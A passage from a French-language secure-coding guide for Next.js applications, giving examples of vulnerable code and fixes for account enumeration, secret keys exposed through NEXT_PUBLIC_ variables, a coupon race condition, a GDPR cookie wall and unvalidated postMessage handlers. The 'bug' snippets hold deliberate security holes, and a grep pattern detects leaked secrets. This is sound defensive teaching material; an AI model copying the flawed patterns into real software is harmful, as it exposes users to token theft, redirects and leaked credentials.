      message: 'Quelqu\'un a tenté de s\'inscrire avec votre email. Si c\'est vous, connectez-vous.' 
    });
  } else {
    // Cas nominal : créer et envoyer lien de confirmation
    const user = await createUser(email);
    await sendConfirmationEmail(user);
  }
  
  // Même réponse dans les 2 cas
  return Response.json({
    success: true,
    message: 'Si cet email n\'est pas déjà inscrit, un lien de confirmation a été envoyé.'
  });
}
```

Appliquer le même pattern sur : `forgot-password`, `login` (sur certains types d'erreurs), `verify-email`.

**Référence :** `advanced.md` §15 — Information disclosure

---

## EXEMPLE 19 — Secret leaked dans NEXT_PUBLIC_

### ❌ Bug détecté

```bash
# .env.local
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_51ABC...
NEXT_PUBLIC_SUPABASE_URL=https://xxx.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...  # ⚠️ anon key OK
NEXT_PUBLIC_SUPABASE_SERVICE_KEY=eyJhbGciOi... # ⚠️ service_role = SECRET
```

```typescript
// lib/stripe.ts (côté serveur, mais importé dans un composant client)
import Stripe from 'stripe';
export const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);
```

Le secret Stripe se retrouve inline dans le bundle JS téléchargé par tous les visiteurs. N'importe qui peut le récupérer via DevTools → Network → n'importe quel chunk JS.

### ✅ Correction automatique

1. **Renommer** la variable (retrait du `NEXT_PUBLIC_`) :

```bash
# .env.local
STRIPE_SECRET_KEY=sk_live_51ABC...
SUPABASE_SERVICE_KEY=eyJhbGciOi...  # ⚠️ usage serveur uniquement
NEXT_PUBLIC_SUPABASE_URL=https://xxx.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...  # OK public
```

2. **Révoquer** immédiatement le secret Stripe live (compromis), en générer un nouveau.

3. **Isoler** l'usage serveur du client :

```typescript
// lib/stripe.server.ts (jamais importé côté client)
import Stripe from 'stripe';
export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
```

```typescript
// components/checkout.tsx (client)
'use client';
// Utiliser la publishable key (pk_live_*) côté client
const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);
```

4. **Vérifier après build** :

```bash
npm run build
grep -rE "(sk_live_|sk_test_|service_role|service_key|password|jwt_secret)" .next/static/chunks/
# Doit retourner vide
```

**Référence :** `advanced.md` §20 — NEXT_PUBLIC_ leak

---

## EXEMPLE 20 — Race condition sur coupon

### ❌ Bug détecté

```typescript
// app/api/coupon/apply/route.ts
export async function POST(request: Request) {
  const { code, cartId } = await request.json();
  
  const coupon = await db.coupon.findUnique({ where: { code } });
  if (!coupon) return Response.json({ error: 'Invalide' }, { status: 400 });
  
  // Check
  if (coupon.usedCount >= coupon.maxUses) {
    return Response.json({ error: 'Épuisé' }, { status: 400 });
  }
  
  // Update — non atomique
  await db.coupon.update({
    where: { id: coupon.id },
    data: { usedCount: { increment: 1 } },
  });
  
  return Response.json({ success: true, discount: coupon.discount });
}
```

Un attaquant envoie 10 requêtes simultanées avec le même coupon limité à 1 usage. Toutes passent le `check` (usedCount=0 < maxUses=1), puis toutes incrémentent → 10 utilisations au lieu de 1.

### ✅ Correction automatique

```typescript
// app/api/coupon/apply/route.ts
export async function POST(request: Request) {
  const { code, cartId } = ApplyCouponSchema.parse(await request.json());
  
  // 1. UPDATE atomique avec condition WHERE
  const result = await db.coupon.updateMany({
    where: {
      code,
      usedCount: { lt: db.coupon.fields.maxUses }, // ✅ check atomique
      isActive: true,
      expiresAt: { gt: new Date() },
    },
    data: { usedCount: { increment: 1 } },
  });
  
  if (result.count === 0) {
    return Response.json({ error: 'Coupon invalide, expiré ou épuisé' }, { status: 400 });
  }
  
  // 2. Empêcher la double-application au même panier (contrainte unique)
  try {
    await db.cartCoupon.create({
      data: { cartId, couponCode: code },
    });
  } catch (err) {
    // Unique violation — déjà appliqué à ce panier
    if (err.code === 'P2002') {
      // Rollback l'incrémentation
      await db.coupon.update({
        where: { code },
        data: { usedCount: { decrement: 1 } },
      });
      return Response.json({ error: 'Coupon déjà appliqué à ce panier' }, { status: 409 });
    }
    throw err;
  }
  
  const coupon = await db.coupon.findUnique({ where: { code } });
  return Response.json({ success: true, discount: coupon!.discount });
}
```

**Explication :** Le pattern `updateMany` avec condition dans `where` fait un seul round-trip DB atomique. Si 10 requêtes arrivent en parallèle, une seule réussit (la DB garantit l'atomicité au niveau ligne). La contrainte unique `cartCoupon(cartId, couponCode)` empêche aussi la double-application au même panier.

**Référence :** `advanced.md` §4 — Race conditions

---

## EXEMPLE 21 — Cookie wall RGPD

### ❌ Bug détecté

```tsx
// app/layout.tsx
export default function RootLayout({ children }) {
  const consent = getConsent();
  
  // ⚠️ Cookie wall : bloque TOUT le contenu
  if (!consent) {
    return (
      <html>
        <body>
          <CookieWall />
        </body>
      </html>
    );
  }
  
  return (
    <html>
      <body>
        {children}
      </body>
    </html>
  );
}
```

L'utilisateur ne peut pas consulter les articles sans accepter les cookies → **interdit par la CNIL** (jurisprudence Planet49, Tribunal UE 2019).

### ✅ Correction automatique

```tsx
// app/layout.tsx
export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {/* Contenu accessible immédiatement */}
        {children}
        
        {/* Bannière en overlay — ne bloque pas */}
        <CookieBanner />
      </body>
    </html>
  );
}

// components/cookie-banner.tsx
'use client';
export function CookieBanner() {
  const [visible, setVisible] = useState(false);
  
  useEffect(() => {
    const consent = getConsent();
    if (!consent) setVisible(true);
  }, []);
  
  if (!visible) return null;
  
  return (
    <div 
      role="dialog" 
      aria-label="Consentement cookies"
      style={{
        position: 'fixed',
        bottom: 0,
        left: 0,
        right: 0,
        zIndex: 1000,
        background: 'white',
        borderTop: '1px solid #ccc',
        padding: '1rem',
      }}
    >
      <p>Nous utilisons des cookies pour [...]</p>
      <div>
        <button onClick={() => acceptAll()}>Tout accepter</button>
        <button onClick={() => refuseAll()}>Refuser les non essentiels</button>
        <a href="/cookies">Personnaliser</a>
      </div>
    </div>
  );
}
```

**Explication :** Le contenu doit être accessible immédiatement au chargement. La bannière apparaît en superposition (overlay) mais ne bloque pas la lecture. L'utilisateur peut consulter, scroller, lire les articles même en refusant les cookies.

**Référence :** `gdpr.md` §15 — Cookie wall interdit

---

## EXEMPLE 22 — postMessage sans validation d'origine

### ❌ Bug détecté

```tsx
// components/payment-widget.tsx
'use client';
import { useEffect } from 'react';

export function PaymentWidget() {
  useEffect(() => {
    window.addEventListener('message', (event) => {
      // ⚠️ Pas de validation d'origin
      if (event.data.type === 'payment-success') {
        // ⚠️ Modification du state critique sans vérification
        window.location.href = event.data.redirectUrl; // open redirect
      }
      
      if (event.data.type === 'set-token') {
        localStorage.setItem('token', event.data.token); // vol de session
      }
    });
  }, []);
  
  return <iframe src="https://payment-provider.com" />;
}
```

N'importe quelle page ouverte dans le navigateur (popup, autre onglet, iframe malveillante) peut envoyer un `postMessage` à cette fenêtre et déclencher la redirection ou injecter un token.

### ✅ Correction automatique

```tsx
// components/payment-widget.tsx
'use client';
import { useEffect } from 'react';
import { z } from 'zod';

const ALLOWED_ORIGINS = [
  'https://payment-provider.com',
];

const MessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('payment-success'),
    redirectUrl: z.string().url().refine(url => {
      // Autoriser uniquement URLs relatives ou même domaine
      try {
        const parsed = new URL(url, window.location.origin);
        return parsed.origin === window.location.origin;
      } catch {
        return false;
      }
    }, 'URL doit être relative'),
  }),
  z.object({
    type: z.literal('payment-error'),
    message: z.string().max(500),
  }),
]);

export function PaymentWidget() {
  useEffect(() => {
    const handler = (event: MessageEvent) => {
      // 1. Valider l'origine
      if (!ALLOWED_ORIGINS.includes(event.origin)) {
        console.warn('postMessage from unauthorized origin:', event.origin);
        return;
      }
      
      // 2. Valider la structure avec Zod
      const parsed = MessageSchema.safeParse(event.data);
      if (!parsed.success) {
        console.warn('Invalid postMessage format:', parsed.error);
        return;
      }
      
      // 3. Action selon type validé
      const message = parsed.data;
      if (message.type === 'payment-success') {
        window.location.href = message.redirectUrl;
      }
    };
    
    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, []);
  
  return <iframe src="https://payment-provider.com/embed" sandbox="allow-scripts allow-same-origin" />;
}

// Côté envoi — toujours préciser targetOrigin (jamais '*')
function sendMessageToIframe(iframe: HTMLIFrameElement, message: unknown) {
  iframe.contentWindow?.postMessage(
    message,
    'https://payment-provider.com' // ✅ pas '*'
  );
}
```

**Explication :** Sans validation d'origin, n'importe quelle fenêtre peut envoyer un message. Le pattern corrigé valide 3 choses : (1) l'expéditeur est dans la whitelist des origins, (2) la structure du message est exactement celle attendue (Zod discriminated union), (3) l'URL de redirection est validée comme étant relative ou même domaine.

**Référence :** `frontend.md` §11 — postMessage ; `advanced.md` §10
